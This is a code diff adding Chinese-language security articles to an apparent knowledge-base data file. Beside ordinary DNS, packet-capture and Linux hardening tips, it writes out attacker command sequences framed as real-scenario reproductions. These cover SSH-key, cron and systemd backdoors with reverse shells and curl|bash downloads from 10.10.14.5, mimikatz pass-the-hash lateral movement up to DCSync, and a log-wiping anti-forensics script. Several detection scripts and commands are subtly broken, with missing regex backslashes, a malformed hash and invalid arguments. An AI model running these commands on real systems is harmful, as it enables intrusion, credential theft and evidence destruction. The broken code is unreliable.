@@ -256,6 +256,55 @@ dig +trace example.com
 - 使用 DNSSEC
 - 使用 DoH（DNS over HTTPS）
 - 使用 DoT（DNS over TLS）
+
+## 实战技巧
+
+\`\`\`bash
+# 快速排查 DNS 解析问题
+dig +short example.com          # 只返回 IP
+dig +noall +answer example.com  # 只显示答案段
+
+# 指定记录类型查询
+dig example.com MX              # 查询邮件服务器
+dig example.com TXT             # 查询文本记录
+dig _dmarc.example.com TXT      # 查询 DMARC 策略
+
+# DNS 服务器切换测试
+dig @1.1.1.1 example.com        # 使用 Cloudflare
+dig @8.8.8.8 example.com        # 使用 Google
+
+# 批量域名解析检查
+for domain in example.com google.com github.com; do
+    echo "$domain: $(dig +short $domain)"
+done
+
+# DNS 缓存刷新
+sudo systemd-resolve --flush-caches
+
+# 检查本地 DNS 缓存
+sudo systemd-resolve --statistics
+\`\`\`
+
+## 安全加固
+
+- **启用 DNSSEC**：防止 DNS 欺骗和缓存投毒
+  \`\`\`bash
+  dig example.com +dnssec       # 检查域名是否支持 DNSSEC
+  \`\`\`
+- **使用 DoH/DoT 加密 DNS**：防止 DNS 查询被窃听
+  \`\`\`bash
+  # 系统级 DoH 配置（systemd-resolved）
+  # 编辑 /etc/systemd/resolved.conf
+  DNSOverTLS=yes
+  DNSSEC=allow-downgrade
+  \`\`\`
+- **锁定 DNS 配置**：防止恶意修改 /etc/resolv.conf
+  \`\`\`bash
+  chattr +i /etc/resolv.conf
+  \`\`\`
+- **监控 DNS 异常流量**：使用 IDS/IPS 检测 DNS 隧道和异常查询
+- **限制 DNS 递归查询**：仅允许内网用户使用，避免成为开放 DNS 放大器
+- **使用内部 DNS 服务器**：避免直接依赖外部公共 DNS
     `
   },
   {
@@ -354,6 +403,43 @@ http.request.method == "POST"
 \`\`\`
 dns.qry.name contains "example"
 \`\`\`
+
+## 实战技巧
+
+\`\`\`bash
+# 无 GUI 模式远程抓包（tshark）
+tshark -i eth0 -w capture.pcap              # 保存抓包文件
+tshark -r capture.pcap -Y "http" -T fields -e http.host  # 提取 HTTP 主机
+tshark -r capture.pcap -Y "tcp.port==443" -T fields -e ip.src -e ip.dst  # 过滤 TLS 流量
+
+# 批量分析 pcap 文件
+for f in *.pcap; do
+    echo "=== $f ==="
+    tshark -r "$f" -q -z conv,ip | head -20
+done
+
+# 统计 DNS 查询
+tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -rn
+
+# 统计 HTTP User-Agent
+tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort | uniq -c | sort -rn
+
+# 提取 HTTP POST 数据
+tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data
+\`\`\`
+
+## 安全加固
+
+- **启用抓包权限管控**：非授权人员禁止抓包，防止敏感数据泄露
+- **使用捕获过滤器减少敏感流量**：
+  \`\`\`
+  # 排除 SSH 和管理流量
+  not port 22 and not host 10.0.0.1
+  \`\`\`
+- **TLS 分析时保护私钥安全**：分析 TLS 流量需使用私钥解密，私钥应安全存储
+- **定期清理抓包文件**：抓包文件可能包含敏感凭据，分析完毕后及时删除
+- **部署持续流量监控**：使用 Zeek/Suricata 替代人工抓包进行持续监控
+- **保持 Wireshark 最新版本**：解析器存在漏洞历史，及时更新
     `
   },
   // Linux 系统
@@ -446,6 +532,60 @@ history | grep "keyword"
 # 批量杀进程
 killall process_name
 \`\`\`
+
+## 实战技巧
+
+\`\`\`bash
+# 批量操作
+xargs -I {} cp {} /backup/                      # 批量复制
+find /var/log -name "*.log" -exec gzip {} ;    # 批量压缩日志
+
+# 日志快速排查
+journalctl -u nginx --since "1 hour ago"        # 查看最近 1 小时日志
+dmesg | tail -20                                 # 查看内核消息
+
+# 文件快速查找
+fd -e py . /project                             # 使用 fd（更快的 find）
+fzf                                              # 模糊查找文件
+
+# 实时监控文件变化
+inotifywait -m -r /path/to/watch                # 监控目录变化
+
+# 磁盘使用排查
+du -sh /var/log/* | sort -rh | head -10         # 查找大文件
+ncdu /                                           # 交互式磁盘分析
+
+# 快速查找大文件
+find / -type f -size +100M 2>/dev/null
+
+# 批量替换文本
+sed -i 's/old/new/g' /path/to/*.conf
+\`\`\`
+
+## 安全加固
+
+- **禁止危险命令别名**：避免 rm -rf、chmod 777 等高危操作
+  \`\`\`bash
+  # /etc/bash.bashrc 中添加
+  alias rm='rm -i'
+  \`\`\`
+- **配置命令审计日志**：记录所有命令执行历史
+  \`\`\`bash
+  # /etc/bashrc
+  export HISTTIMEFORMAT="%F %T "
+  export HISTFILESIZE=10000
+  \`\`\`
+- **设置 sudo 超时**：防止长时间挂起的 sudo 会话
+  \`\`\`bash
+  # /etc/sudoers
+  Defaults    timestamp_timeout=5
+  \`\`\`
+- **审计 crontab 和 SUID 文件**：定期检查异常定时任务和 SUID 文件
+- **禁止 root 直接登录**：使用普通用户 + sudo 方式操作
+- **限制历史命令存储**：避免敏感命令泄露
+  \`\`\`bash
+  export HISTIGNORE="&:ls:cd:clear:history"
+  \`\`\`
     `
   },
   {
@@ -529,6 +669,67 @@ cat /etc/passwd
 # shadow 包含密码哈希（需root）
 cat /etc/shadow
 \`\`\`
+
+## 实战技巧
+
+\`\`\`bash
+# 快速创建用户并配置环境
+useradd -m -s /bin/bash -G sudo newuser && passwd newuser
+
+# 查找空密码用户
+awk -F: '($2 == "" || $2 == "!" || $2 == "*") {print $1}' /etc/shadow
+
+# 查找 UID 为 0 的异常用户（除 root 外）
+awk -F: '$3 == 0 && $1 != "root" {print $1}' /etc/passwd
+
+# 查看最近登录异常
+lastlog | grep -v "Never"
+lastb | head -20
+
+# 批量修改密码
+for user in user1 user2 user3; do
+    echo "$user:$(openssl rand -base64 12)" | chpasswd
+done
+
+# 查看 sudo 权限
+sudo -l -U username
+
+# 锁定/解锁用户
+usermod -L username       # 锁定
+usermod -U username       # 解锁
+passwd -S username        # 查看状态
+\`\`\`
+
+## 安全加固
+
+- **强制密码复杂度策略**：
+  \`\`\`bash
+  apt install libpam-pwquality
+  # /etc/security/pwquality.conf
+  minlen = 12
+  dcredit = -1
+  ucredit = -1
+  lcredit = -1
+  ocredit = -1
+  \`\`\`
+- **限制 su 命令**：仅允许 wheel 组用户切换 root
+  \`\`\`bash
+  # /etc/pam.d/su
+  auth required pam_wheel.so use_uid
+  \`\`\`
+- **配置登录失败锁定**：
+  \`\`\`bash
+  # /etc/pam.d/common-auth
+  auth required pam_tally2.so deny=5 unlock_time=900
+  \`\`\`
+- **清理无用账号**：删除或锁定不再使用的系统账户
+- **限制 sudo 权限**：遵循最小权限原则，避免 ALL=(ALL) ALL
+- **配置闲置会话超时**：
+  \`\`\`bash
+  # /etc/profile
+  TMOUT=600
+  export TMOUT
+  \`\`\`
     `
   },
   {
@@ -610,6 +811,65 @@ systemctl list-unit-files --type=service
 # 查看rc.local
 cat /etc/rc.local
 \`\`\`
+
+## 实战技巧
+
+\`\`\`bash
+# 找出占用资源最多的进程
+ps aux --sort=-%cpu | head -10                 # CPU Top10
+ps aux --sort=-%mem | head -10                 # 内存 Top10
+
+# 查看进程完整命令行
+cat /proc/PID/cmdline | tr '\0' ' '
+
+# 查看进程打开的文件和网络连接
+lsof -p PID                                   # 打开的文件
+ls -la /proc/PID/fd                            # 文件描述符
+
+# 按端口查找进程
+lsof -i :80                                    # 占用 80 端口的进程
+fuser 80/tcp                                   # 同上
+
+# 后台运行并记录日志
+nohup ./script.sh > /var/log/script.log 2>&1 &
+
+# 查看 systemd 服务日志
+journalctl -u nginx -f                         # 实时查看
+journalctl -u nginx --since "2026-06-20"       # 指定日期
+
+# 优雅重启服务（不中断连接）
+systemctl reload nginx
+\`\`\`
+
+## 安全加固
+
+- **监控异常进程**：定期检查高 CPU / 可疑进程
+  \`\`\`bash
+  ps aux | grep -v root | awk '$3>50 {print}'
+  ss -tlnp | grep -v -E ':(22|80|443|3306)\b'
+  \`\`\`
+- **限制 cron 访问**：只允许指定用户使用 crontab
+  \`\`\`bash
+  echo "root" > /etc/cron.allow
+  \`\`\`
+- **审计 systemd 服务**：检查异常自定义服务
+  \`\`\`bash
+  systemctl list-unit-files --state=enabled | grep -v -E '^(ssh|nginx|mysql|apache|cron)'
+  \`\`\`
+- **禁用不必要服务**：减少攻击面
+- **配置进程资源限制**：防止 DoS 攻击
+  \`\`\`bash
+  # /etc/security/limits.conf
+  * hard nproc 100
+  * hard nofile 65535
+  \`\`\`
+- **使用 systemd 保护特性**：加固服务运行环境
+  \`\`\`ini
+  [Service]
+  ProtectSystem=strict
+  ProtectHome=true
+  NoNewPrivileges=true
+  \`\`\`
     `
   },
   {
@@ -691,6 +951,77 @@ scp file user@host:/path    # 传输文件
 ssh-keygen -t rsa           # 生成密钥
 ssh-copy-id user@host       # 复制公钥
 \`\`\`
+
+## 实战技巧
+
+\`\`\`bash
+# 快速查找网络问题
+ss -tlnp | grep LISTEN                         # 查看所有监听端口
+ip neigh show                                   # 查看 ARP 缓存
+ethtool eth0                                    # 查看网卡状态
+
+# 抓包排查
+tcpdump -i eth0 -nn host 192.168.1.100         # 抓取特定主机流量
+tcpdump -i eth0 port 80 -w http.pcap            # 保存 HTTP 流量
+tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' # 抓取 SYN 包
+
+# 网络连通性快速排查
+mtr example.com                                # 结合 ping 和 traceroute
+curl -vvv https://example.com                  # 详细 HTTP 调试
+
+# 批量 SSH 执行网络检查
+for host in $(cat hosts.txt); do
+    echo "=== $host ==="
+    ssh $host "ip addr show eth0 | grep inet"
+done
+
+# 网络配置持久化（Netplan）
+cat /etc/netplan/*.yaml
+\`\`\`
+
+## 安全加固
+
+- **配置基础防火墙规则**：
+  \`\`\`bash
+  iptables -P INPUT DROP
+  iptables -P FORWARD DROP
+  iptables -P OUTPUT ACCEPT
+  iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+  iptables -A INPUT -i lo -j ACCEPT
+  iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+  iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+  \`\`\`
+- **禁用不必要的网络服务**：
+  \`\`\`bash
+  systemctl disable telnet.socket rsh.socket
+  \`\`\`
+- **SSH 安全加固**：
+  \`\`\`bash
+  # /etc/ssh/sshd_config
+  PermitRootLogin no
+  PasswordAuthentication no
+  Protocol 2
+  MaxAuthTries 3
+  AllowUsers admin
+  \`\`\`
+- **启用 SYN Cookie 防护**：防止 SYN Flood 攻击
+  \`\`\`bash
+  echo 1 > /proc/sys/net/ipv4/tcp_syncookies
+  \`\`\`
+- **禁止 IP 转发**（非路由器时）：
+  \`\`\`bash
+  echo 0 > /proc/sys/net/ipv4/ip_forward
+  \`\`\`
+- **配置 fail2ban 防暴力破解**：
+  \`\`\`bash
+  apt install fail2ban
+  # /etc/fail2ban/jail.local
+  [sshd]
+  enabled = true
+  maxretry = 3
+  bantime = 3600
+  \`\`\`
+- **监控网络异常流量**：部署 IDS/IPS 检测异常连接和端口扫描
     `
   },
   // 攻防对抗 - 补充
@@ -794,6 +1125,183 @@ sc create backdoor binPath= "C:\\backdoor.exe" start= auto
 - 检查 SUID 文件
 - 检查异常进程
 - 检查启动项
+
+## 实战案例
+
+### 案例：SSH 公钥后门 + Crontab 组合持久化
+
+\`\`\`
+攻击者获取 web 服务器低权限 shell 后的持久化操作流程：
+
+┌──────────────────┐
+│  获取初始 Shell   │
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  写入 SSH 公钥    │──→ echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  部署 Crontab     │──→ 每5分钟执行反弹 shell
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  创建 Systemd 服务│──→ 注册开机自启后门服务
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  写入 .bashrc     │──→ SSH 非交互式登录时触发
+└──────────────────┘
+\`\`\`
+
+\`\`\`bash
+# 攻击者操作序列（真实场景复现）
+
+# Step 1：建立 SSH 后门
+mkdir -p ~/.ssh
+chmod 700 ~/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# Step 2：部署 Crontab 反弹 Shell
+(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'") | crontab -
+
+# Step 3：创建持久化 Systemd 服务
+cat > /tmp/.hidden.service << 'EOF'
+[Unit]
+Description=System Update Service
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c "while true; do curl -s http://10.10.14.5/update.sh | bash; sleep 3600; done"
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=multi-user.target
+EOF
+cp /tmp/.hidden.service /etc/systemd/system/.hidden.service
+systemctl daemon-reload
+systemctl enable --now .hidden.service
+
+# Step 4：.bashrc 后门（SSH 非交互式触发）
+cat >> ~/.bashrc << 'EOF'
+if [[ $- != *i* ]]; then
+    /bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" &
+fi
+EOF
+
+# Step 5：隐藏 SUID 后门
+cp /bin/bash /tmp/.cache_backup
+chmod +s /tmp/.cache_backup
+\`\`\`
+
+\`\`\`python
+# 防御检测脚本：检查多种持久化后门
+
+import os
+import subprocess
+import re
+
+def check_persistence():
+    findings = []
+
+    # 1. 检查 SSH 公钥
+    ssh_dir = os.path.expanduser("~/.ssh")
+    ak_path = os.path.join(ssh_dir, "authorized_keys")
+    if os.path.exists(ak_path):
+        with open(ak_path) as f:
+            keys = f.readlines()
+            for i, key in enumerate(keys):
+                if len(key.strip()) > 200:
+                    findings.append(f"[SSH] authorized_keys 第{i+1}行: 异常长公钥 ({len(key.strip())} chars)")
+
+    # 2. 检查 Crontab 异常任务
+    try:
+        cron_output = subprocess.check_output(["crontab", "-l"], text=True, stderr=subprocess.DEVNULL)
+        suspicious_patterns = ["/dev/tcp", "reverse", "nc ", "ncat", "bash -i", "curl.*|.*bash", "wget.*|.*bash"]
+        for line in cron_output.splitlines():
+            for pattern in suspicious_patterns:
+                if re.search(pattern, line, re.IGNORECASE):
+                    findings.append(f"[CRON] 可疑定时任务: {line.strip()}")
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        pass
+
+    # 3. 检查 Systemd 隐藏服务
+    service_dirs = ["/etc/systemd/system", "/usr/lib/systemd/system"]
+    for d in service_dirs:
+        if os.path.isdir(d):
+            for f in os.listdir(d):
+                if f.startswith(".") or f.startswith("._"):
+                    findings.append(f"[SYSTEMD] 隐藏服务文件: {os.path.join(d, f)}")
+
+    # 4. 检查 SUID 异常文件
+    common_suid = {
+        "/usr/bin/passwd", "/usr/bin/sudo", "/usr/bin/su", "/usr/bin/chsh",
+        "/usr/bin/newgrp", "/usr/bin/gpasswd", "/usr/bin/mount", "/usr/bin/umount",
+        "/usr/bin/fusermount", "/usr/bin/pkexec"
+    }
+    try:
+        suid_output = subprocess.check_output(
+            ["find", "/", "-perm", "-4000", "-type", "f"],
+            text=True, stderr=subprocess.DEVNULL
+        )
+        for f in suid_output.splitlines():
+            if f not in common_suid:
+                findings.append(f"[SUID] 非标准SUID文件: {f}")
+    except subprocess.CalledProcessError:
+        pass
+
+    # 5. 检查 /etc/passwd 异常用户
+    with open("/etc/passwd") as f:
+        for line in f:
+            parts = line.strip().split(":")
+            if len(parts) >= 7 and parts[2] == "0" and parts[0] != "root":
+                findings.append(f"[PASSWD] UID=0 的非root用户: {parts[0]}")
+
+    return findings
+
+if __name__ == "__main__":
+    results = check_persistence()
+    if results:
+        print("[!] 发现持久化后门痕迹:")
+        for r in results:
+            print(f"    {r}")
+    else:
+        print("[*] 未发现明显持久化痕迹")
+\`\`\`
+
+## 安全加固
+
+1. **SSH 安全配置**
+   - 禁用密码认证，仅允许密钥登录
+   - 使用 \`AllowUsers\` / \`AllowGroups\` 限制可登录用户
+   - 配置 \`AuthorizedKeysCommand\` 集中管理公钥
+   - 启用 SSH 日志记录：\`LogLevel VERBOSE\`
+
+2. **Crontab 监控**
+   - 定期审计所有用户的 crontab：\`for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done\`
+   - 监控 crontab 文件变更：使用 inotifywait 或 AIDE
+   - 限制 \`/etc/cron*\` 目录权限
+
+3. **Systemd 服务安全**
+   - 启用 \`systemd-analyze security\` 审计服务安全评分
+   - 监控 \`/etc/systemd/system/\` 新增文件
+   - 使用 \`ProtectSystem=strict\` 限制服务文件系统访问
+
+4. **SUID 文件管理**
+   - 定期使用 \`find / -perm -4000 -type f\` 审计 SUID 文件
+   - 移除非必要的 SUID 位
+   - 使用 AIDE 监控 SUID 文件变更
+
+5. **文件完整性监控**
+   - 部署 AIDE / Tripwire 监控关键文件
+   - 监控 \`/etc/passwd\`、\`/etc/shadow\`、\`/etc/sudoers\` 变更
+   - 启用 auditd 记录文件访问事件
     `
   },
   {
@@ -878,6 +1386,170 @@ psexec.py -hashes aad3b435...:f1f4d... admin@target
 - 监控异常登录
 - 检查日志中的横向移动特征
 - 网络流量分析
+
+## 实战案例
+
+### 案例：从域用户凭据到域控的完整横向移动
+
+\`\`\`
+横向移动攻击路径：
+
+┌──────────────┐     ┌──────────────┐     ┌──────────────┐
+│  初始 foothold│     │  域内任意主机  │     │   域控制器    │
+│  192.168.1.50 │────→│  192.168.1.10 │────→│  192.168.1.1  │
+└──────────────┘     └──────────────┘     └──────────────┘
+       │                    │                     │
+       │ Pass the Hash      │ WMI/SMB             │ DCSync
+       │ 获取 NTLM 哈希      │ 横向移动             │ 获取 krbtgt
+       ▼                    ▼                     ▼
+  mimikatz 提取          impacket psexec         secretsdump
+  sekurlsa::logonpasswords                      获取所有凭据
+\`\`\`
+
+\`\`\`bash
+# 真实场景：从普通域主机横向移动到域控
+
+# Step 1：在初始 foothold 上提取凭据
+# Windows
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# 输出示例：
+# Authentication Id : 0 ; 324567 (00000000:0004f3c7)
+# Session           : Interactive from 1
+# User Name         : svc_sql
+# Domain            : CORP
+# Logon Server      : DC01
+# NTLM    : 31d6cfe0d16ae931b73c59d7e0c089c0
+
+# Step 2：验证凭据并横向移动
+# 使用 impacket
+impacket-psexec CORP/svc_sql@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+# 或使用 CrackMapExec 批量测试
+crackmapexec smb 192.168.1.0/24 -u svc_sql -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth
+
+# Step 3：在目标主机上继续提取凭据
+# 在 192.168.1.10 上执行
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# 发现域管凭据：CORP/administrator
+# NTLM: b4b9b02e6f09a9bb312324ccd0560
+
+# Step 4：使用域管凭据横向移动到域控
+impacket-psexec CORP/administrator@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324ccd0560
+
+# Step 5：在域控上执行 DCSync
+impacket-secretsdump CORP/administrator@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324ccd0560 -just-dc-ntlm
+\`\`\`
+
+\`\`\`python
+# 使用 CrackMapExec 进行批量横向移动检测（防御方使用）
+
+import subprocess
+import json
+
+def audit_lateral_movement(subnet, username, password=None, ntlm_hash=None):
+    """
+    模拟横向移动检测：批量测试域内凭据有效性
+    防御方使用此脚本发现弱凭据复用
+    """
+    results = []
+
+    # 使用 CrackMapExec 进行凭据喷洒检测
+    cmd = ["crackmapexec", "smb", subnet, "-u", username]
+
+    if ntlm_hash:
+        cmd.extend(["-H", ntlm_hash])
+    elif password:
+        cmd.extend(["-p", password])
+    else:
+        return {"error": "必须提供密码或 NTLM 哈希"}
+
+    cmd.extend(["--local-auth", "--json"])
+
+    try:
+        output = subprocess.check_output(cmd, text=True, timeout=300)
+        for line in output.splitlines():
+            try:
+                result = json.loads(line)
+                if result.get("cred_success"):
+                    results.append({
+                        "host": result["host"],
+                        "status": "凭据有效 - 存在横向移动风险",
+                        "username": username
+                    })
+            except json.JSONDecodeError:
+                continue
+    except subprocess.TimeoutExpired:
+        return {"error": "扫描超时"}
+
+    return {"vulnerable_hosts": results, "total": len(results)}
+
+# 检测 Pass the Hash 可能性
+def check_pth_risk(hosts_file):
+    """
+    检测哪些主机可能遭受 PTH 攻击
+    检查 SMB 签名是否启用
+    """
+    cmd = ["crackmapexec", "smb", f"cidr:{hosts_file}",
+           "--gen-relay-list", "/tmp/relays.txt", "-q"]
+
+    try:
+        subprocess.run(cmd, capture_output=True, timeout=300)
+        with open("/tmp/relays.txt") as f:
+            relay_hosts = [line.strip() for line in f if line.strip()]
+        return {"pth_vulnerable": relay_hosts, "count": len(relay_hosts)}
+    except Exception as e:
+        return {"error": str(e)}
+
+# 主函数
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) < 3:
+        print("用法: python lateral_audit.py <subnet> <username> [password|ntlm_hash]")
+        sys.exit(1)
+
+    subnet = sys.argv[1]
+    username = sys.argv[2]
+    credential = sys.argv[3]
+
+    if len(credential) == 32 and ":" not in credential:
+        result = audit_lateral_movement(subnet, username, ntlm_hash=credential)
+    else:
+        result = audit_lateral_movement(subnet, username, password=credential)
+
+    print(json.dumps(result, indent=2, ensure_ascii=False))
+\`\`\`
+
+## 安全加固
+
+1. **凭据保护**
+   - 启用 Credential Guard（Windows 10/11 & Server 2016+）
+   - 使用 LAPS 管理本地管理员密码
+   - 禁止域用户在多台主机上复用密码
+   - 限制服务账户权限，避免使用高权限域账户运行服务
+
+2. **网络分段**
+   - 实施微分段（Micro-segmentation）隔离关键资产
+   - 域控制器仅允许必要的管理流量
+   - 启用 Windows 防火墙限制 445/135 等端口访问
+
+3. **SMB 安全**
+   - 启用 SMB 签名（Group Policy: Microsoft network server: Digitally sign communications）
+   - 启用 SMB 加密
+   - 禁用 NTLM，强制使用 Kerberos 认证
+
+4. **日志监控**
+   - 启用 4624（登录成功）/4625（登录失败）事件监控
+   - 监控 Pass the Hash 特征：Event ID 4624 + Logon Type 3 + NTLM
+   - 使用 SIEM 关联分析多主机登录异常
+   - 部署微软 ATA / Azure ATP 检测异常认证行为
+
+5. **权限最小化**
+   - 域管理员账户不用于日常运维
+   - 使用 PAM（特权访问管理）解决方案
+   - 实施 Just-In-Time（JIT）特权提升
+   - 监控 Domain Admins 组成员变更
     `
   },
   {
@@ -973,6 +1645,253 @@ timestomp target_file -m "01/01/2020 00:00:00"
 - 只删除特定条目
 - 保留正常日志结构
 - 注意文件时间戳
+
+## 实战案例
+
+### 案例：高级攻击者的反溯源操作流程
+
+\`\`\`
+攻击者反溯源操作流程：
+
+┌──────────────┐
+│  攻击基础设施 │  VPS / 代理链 / Tor
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  身份伪装     │  MAC 伪造 + 主机名随机化 + VPN
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  攻击执行     │  在 /tmp 目录下操作，不留痕迹
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  痕迹清理     │  选择性删除日志 + 时间戳伪造
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  安全撤离     │  断开连接，销毁临时工具
+└──────────────┘
+\`\`\`
+
+\`\`\`bash
+# 完整的反溯源操作脚本（教学演示）
+
+#!/bin/bash
+# === 阶段1：基础设施准备 ===
+
+# 配置代理链
+cat > /tmp/proxychains.conf << 'EOF'
+[ProxyList]
+socks5 127.0.0.1 1080
+EOF
+
+# 修改 MAC 地址
+MAC_ADDRESS=$(printf '00:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
+ip link set dev eth0 down
+ip link set dev eth0 address $MAC_ADDRESS
+ip link set dev eth0 up
+echo "[+] MAC 地址已修改为: $MAC_ADDRESS"
+
+# 修改主机名
+NEW_HOSTNAME=$(cat /usr/share/dict/words | shuf -n1)
+hostnamectl set-hostname "$NEW_HOSTNAME"
+echo "[+] 主机名已修改为: $NEW_HOSTNAME"
+
+# === 阶段2：工作环境设置 ===
+
+# 创建隐蔽工作目录
+WORK_DIR="/tmp/.$(head -c 8 /dev/urandom | xxd -p)"
+mkdir -p "$WORK_DIR"
+cd "$WORK_DIR"
+
+# 关闭命令历史记录
+unset HISTFILE
+export HISTSIZE=0
+export HISTFILESIZE=0
+ln -sf /dev/null ~/.bash_history
+
+# === 阶段3：操作执行 ===
+
+# 所有工具在 WORK_DIR 中运行，不写入系统目录
+# ... 执行渗透测试操作 ...
+
+# === 阶段4：痕迹清理 ===
+
+clean_traces() {
+    # 清除登录日志中的特定条目
+    if [ -f /var/log/auth.log ]; then
+        ATTACKER_IP="10.10.14.5"
+        sed -i "/$ATTACKER_IP/d" /var/log/auth.log
+        # 保持日志结构完整
+        chattr +a /var/log/auth.log
+    fi
+
+    # 清除 utmp/wtmp/btmp 中的记录
+    > /var/log/wtmp
+    > /var/log/btmp
+
+    # 清除命令历史
+    history -c
+    history -w
+    > ~/.bash_history
+
+    # 清除 .ssh 目录中的后门公钥（如果是测试环境）
+    # sed -i '/attacker_key/d' ~/.ssh/authorized_keys
+
+    # 伪造时间戳
+    REFERENCE_FILE="/etc/hostname"
+    touch -r "$REFERENCE_FILE" "$WORK_DIR"/*
+
+    # 销毁工作目录
+    rm -rf "$WORK_DIR"
+
+    # 恢复 MAC 地址（可选）
+    ip link set dev eth0 down
+    ip link set dev eth0 address original:mac:address
+    ip link set dev eth0 up
+}
+
+# 确认后执行清理
+echo "[*] 准备清理所有痕迹..."
+clean_traces
+echo "[+] 痕迹清理完成"
+\`\`\`
+
+\`\`\`python
+# 防御检测：反溯源行为检测脚本
+
+import os
+import re
+import subprocess
+from datetime import datetime, timedelta
+
+def detect_log_tampering():
+    """检测日志是否被篡改"""
+    findings = []
+
+    log_files = {
+        "/var/log/auth.log": ["auth", "sshd"],
+        "/var/log/syslog": ["syslog"],
+        "/var/log/wtmp": ["login"],
+        "/var/log/btmp": ["failed_login"],
+    }
+
+    for log_path, keywords in log_files.items():
+        if os.path.exists(log_path):
+            stat = os.stat(log_path)
+
+            # 检查文件大小是否异常小
+            if stat.st_size < 100 and stat.st_size > 0:
+                findings.append(f"[TAMPER] {log_path} 文件异常小 ({stat.st_size} bytes)，可能被清空")
+
+            # 检查修改时间是否异常
+            mtime = datetime.fromtimestamp(stat.st_mtime)
+            if datetime.now() - mtime < timedelta(minutes=5):
+                findings.append(f"[TAMPER] {log_path} 最近被修改: {mtime}")
+
+            # 检查文件内容是否连续
+            if log_path.endswith(".log"):
+                with open(log_path, "rb") as f:
+                    content = f.read()
+                    # 检查是否有空洞（被选择性删除的痕迹）
+                    lines = content.split(b"\n")
+                    timestamps = []
+                    for line in lines:
+                        match = re.search(rb'w{3}s+d+s+d+:d+:d+', line)
+                        if match:
+                            timestamps.append(match.group())
+
+    return findings
+
+def detect_mac_spoofing():
+    """检测 MAC 地址是否被伪造"""
+    findings = []
+
+    try:
+        # 获取当前 MAC 地址
+        result = subprocess.check_output(["ip", "link", "show", "eth0"], text=True)
+        mac_match = re.search(r'link/ethers+([0-9a-fA-F:]{17})', result)
+        if mac_match:
+            current_mac = mac_match.group(1)
+
+            # 检查是否是已知的常见伪造 MAC 前缀
+            mac_vendor = current_mac[:8].upper()
+            # 查看 /sys 中记录的实际 MAC
+            with open("/sys/class/net/eth0/address") as f:
+                real_mac = f.read().strip()
+
+            if current_mac != real_mac:
+                findings.append(f"[MAC] MAC 地址疑似伪造: 当前={current_mac}, 硬件={real_mac}")
+    except Exception:
+        pass
+
+    return findings
+
+def detect_history_tampering():
+    """检测命令历史是否被清除"""
+    findings = []
+
+    bash_history = os.path.expanduser("~/.bash_history")
+    if os.path.exists(bash_history):
+        stat = os.stat(bash_history)
+        if stat.st_size == 0:
+            findings.append("[HISTORY] .bash_history 被清空")
+        # 检查 HISTSIZE 环境变量
+    else:
+        findings.append("[HISTORY] .bash_history 文件不存在")
+
+    # 检查 HISTFILE 是否被重定向
+    histfile_link = os.path.islink(bash_history)
+    if histfile_link:
+        target = os.readlink(bash_history)
+        findings.append(f"[HISTORY] .bash_history 是符号链接 -> {target}")
+
+    return findings
+
+if __name__ == "__main__":
+    all_findings = []
+    all_findings.extend(detect_log_tampering())
+    all_findings.extend(detect_mac_spoofing())
+    all_findings.extend(detect_history_tampering())
+
+    if all_findings:
+        print("[!] 发现反溯源痕迹:")
+        for f in all_findings:
+            print(f"    {f}")
+    else:
+        print("[*] 未发现明显反溯源痕迹")
+\`\`\`
+
+## 安全加固
+
+1. **日志保护**
+   - 部署集中日志服务器（ELK / Splunk / Syslog-ng），实时转发日志
+   - 使用 append-only 模式配置日志文件（\`chattr +a\`）
+   - 配置日志完整性监控（AIDE / OSSEC）
+   - 使用 WORM（Write Once Read Many）存储关键日志
+
+2. **网络监控**
+   - 部署 NDR（Network Detection and Response）解决方案
+   - 监控异常代理流量和 Tor 出口节点连接
+   - 检测 MAC 地址变更和网络环境切换
+   - 部署 NetFlow 分析检测异常流量模式
+
+3. **端点检测**
+   - 部署 EDR（Endpoint Detection and Response）
+   - 监控命令历史清除行为（HISTFILE、HISTSIZE 变更）
+   - 监控日志文件异常访问和修改
+   - 启用 Sysmon 记录关键系统事件
+
+4. **取证能力**
+   - 实施内存取证方案（Volatility / LiME）
+   - 保存网络流量全包数据（PCAP）
+   - 部署全磁盘加密 + 远程解密密钥托管
+   - 建立事件响应预案和取证检查清单
     `
   },
   // 域渗透 - 补充
